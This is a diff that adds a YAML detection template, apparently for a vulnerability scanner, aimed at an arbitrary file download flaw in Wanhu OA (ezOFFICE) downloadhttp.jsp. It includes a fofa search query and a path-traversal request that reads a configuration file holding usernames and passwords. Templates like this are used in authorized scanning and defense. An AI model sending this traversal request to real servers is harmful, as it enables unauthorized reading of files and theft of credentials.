@@ -1,0 +1,19 @@
+id: wanhu-oa-downloadhttp-fileread
+
+info:
+  name: 万户OA downloadhttp.jsp 任意文件下载漏洞
+  author: zan8in
+  severity: high
+  description: |
+    万户OA downloadhttp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
+    fofa: app="万户网络-ezOFFICE"
+  tags: wanhu,download,http,fileread
+  created: 2025/03/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
+    expression: response.status == 200 && response.body.bcontains(b'<%') && response.body.bcontains(b'//Username') && response.body.bcontains(b'//Password')
+expression: r0()
